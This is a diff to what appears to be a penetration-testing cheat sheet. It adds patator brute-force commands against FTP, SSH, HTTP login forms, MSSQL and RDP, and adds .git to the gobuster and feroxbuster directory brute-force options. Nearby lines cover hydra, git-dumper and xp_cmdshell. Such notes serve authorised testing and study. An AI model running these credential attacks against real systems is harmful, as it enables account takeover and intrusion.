@@ -93,6 +93,7 @@ get <file>
 
 # burteforce
 hydra ftp://<ip> -l <user> -P <wordlist>
+patator ftp_login host=<ip> user=FILE0 password=FILE1 0=<userlist> 1=<wordlist> -x ignore:mesg='Login incorrect.' -x ignore,reset,retry:code=500
 
 # nse
 locate .nse | grep ftp
@@ -109,6 +110,7 @@ ssh username@<ip> -i <key>
 
 # bruteforce
 hydra ssh://<ip> -l <user> -P <wordlist> -s <port>
+patator ssh_login host=<ip> user=<user> password=FILE0 0=<wordlist> -x ignore:mesg='Authentication failed.'
 ```
 
 ### SMTP - 25
@@ -195,14 +197,13 @@ nikto -h <url>
 sslscan <host>:<port>
 
 # brute force directories
-gobuster dir -u <url> -w <wordlist> -t 60 -x pdf,txt,php,config
+gobuster dir -u <url> -w <wordlist> -t 60 -x pdf,txt,php,config,git
 wfuzz -w <wordlist> <URL>/FUZZ
-feroxbuster -u <url> -w <wordlist> -t 60 -x pdf,txt
+feroxbuster -u <url> -w <wordlist> -t 60 -x pdf -x txt -x php -x config -x git
 
-# brute force login page with Caido or Hydra
+# brute force login page with hydra and patator
 hydra -L <userlist> -P <wordlist> <target> http-{get|post}-form "/login:username=^USER^&password=^PASS^:F=Login failed. Invalid"
-# basic auth
-hydra -L <userlist> -P <wordlist> <target> http-{get|post} /
+patator http_fuzz url=<url> method=POST body='user=admin&pass=COMBO00&sublogin=1' 0=<wordlist> accept_cookie=1 follow=1 max_follow=2 -x ignore:fgrep='Invalid password' -x ignore:clen=5881
 
 # if .git found, dump it
 git-dumper <url>/.git ./website
@@ -427,6 +428,7 @@ impacket-mssqlclient <DOMAIN>/<USERNAME>:<PASSWORD>@<IP> -windows-auth
 
 # bruteforce
 hydra mssql://<ip> -L <userlist> -P <wordlist>
+patator mssql_login host=<ip> user=sa password=FILE0 0=<wordlist> -x ignore:fgrep='Login failed for user'
 
 # run commands
 enable_xp_cmdshell
@@ -439,6 +441,7 @@ nxc rdp <ip> -u <user> -p <pass>
 
 # bruteforce
 hydra rdp://<ip> -L <userlist> -P <wordlist>
+patator rdp_login host=<ip> user='administrator' password=FILE0 0=<wordlist>
 ```
 
 #### RPC RID Cycling Attack
